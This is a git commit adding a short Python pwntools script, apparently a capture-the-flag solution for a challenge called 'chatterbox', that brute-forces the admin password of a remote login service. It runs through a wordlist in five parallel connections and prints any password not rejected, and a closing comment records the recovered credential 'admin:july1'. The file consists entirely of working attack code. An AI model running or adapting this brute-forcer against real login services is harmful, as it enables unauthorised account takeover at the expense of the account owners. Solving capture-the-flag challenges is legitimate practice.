69ae9ecd1b6d041d115e20e740cff8c10727c98d
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-07-12 16:30:27 +0100

    Create brute.py

---
+++ solvescript/csean/pwn/chatterbox/brute.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python3
+from pwn import *
+import sys
+from multiprocessing import Pool as pool
+from warnings import filterwarnings
+
+# Set context
+context.log_level = 'info'
+filterwarnings('ignore')
+
+# Define a function for the brute force >3
+def brute_password(password):
+    io = remote('0.cloud.chals.io', 33091)
+    io.recv(1024) 
+    io.sendline(b"admin")
+    io.recv(1024)
+    io.sendline(password)
+    result = io.recv(1024)
+    print(result)
+    if b"Invalid credentials" not in result:
+        print(f'Password: {password}')
+        
+        
+# Read password from the wordlist 
+with open('wordlist.txt', 'r') as fd:
+    wordlist = fd.readlines()
+
+if __name__ == '__main__':
+    start = pool(int('5'))
+    start.map(brute_password, wordlist)
+
+# Credential: admin:july1
